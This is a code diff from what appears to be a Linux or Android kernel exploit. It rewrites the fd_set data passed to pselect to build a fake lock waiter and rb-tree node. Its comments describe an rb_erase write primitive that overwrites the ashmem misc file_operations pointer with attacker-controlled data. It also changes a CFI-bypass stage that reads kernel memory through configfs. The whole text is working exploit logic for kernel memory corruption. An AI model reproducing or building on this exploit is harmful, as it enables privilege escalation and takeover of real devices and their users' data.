@@ -79,14 +79,21 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(out);
   FD_ZERO(ex);
 
-  fdset_put_word(in, 0, fake_w0);
-  fdset_put_word(in, 1, 0);
-  fdset_put_word(in, 2, 0);
-  fdset_put_word(in, 3, 0);
-  fdset_put_word(ex, 0, text_addr(INIT_TASK));
-  fdset_put_word(ex, 1, fake_lock);
-  fdset_put_word(ex, 2, 3);
-  fdset_put_word(ex, 3, 0);
+  /* rb_erase write primitive (RIGHT-child case, matching spray):
+   * Layout: __rb_parent_color = fake_fops (VALUE)
+   *         rb_right = data_addr(ASHMEM_MISC_FOPS) (TARGET)
+   *         rb_left = 0 (enter right-child-only case)
+   * Writes: PRIMARY: *(root->rb_node) = rb_right (corrupts fake lock, harmless)
+   *         SECONDARY: *(rb_right) = __rb_parent_color → *(TARGET) = fake_fops ✓
+   */
+  fdset_put_word(in, 0, fake_fops);                    /* tree.__rb_parent_color = VALUE */
+  fdset_put_word(in, 1, data_addr(ASHMEM_MISC_FOPS));  /* tree.rb_right = TARGET */
+  fdset_put_word(in, 2, 0);                            /* tree.rb_left = 0 */
+  fdset_put_word(in, 3, 0);                            /* tree.prio */
+  fdset_put_word(ex, 0, fake_task);                    /* task */
+  fdset_put_word(ex, 1, fake_lock);                    /* lock */
+  fdset_put_word(ex, 2, 0);                            /* wake_state */
+  fdset_put_word(ex, 3, 0);                            /* ww_ctx */
 }
 
 void do_pselect_fake_lock_route(void) {
@@ -255,7 +262,7 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops = runtime_fops_alias();
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
